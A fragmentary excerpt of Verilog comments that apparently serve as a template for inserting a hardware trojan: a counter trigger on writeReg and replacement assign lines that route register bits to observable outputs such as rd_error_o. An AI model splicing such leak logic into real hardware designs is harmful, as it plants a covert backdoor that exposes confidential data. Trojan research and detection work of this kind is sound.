 ...
 *   
 * Trigger: Counter on writeReg
 * Payload: Route out[0] to observable output
 * 
...
//   Replace with:
//     assign out = trojan_active ? writeReg[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? writeReg[0] : 1'b0;
//
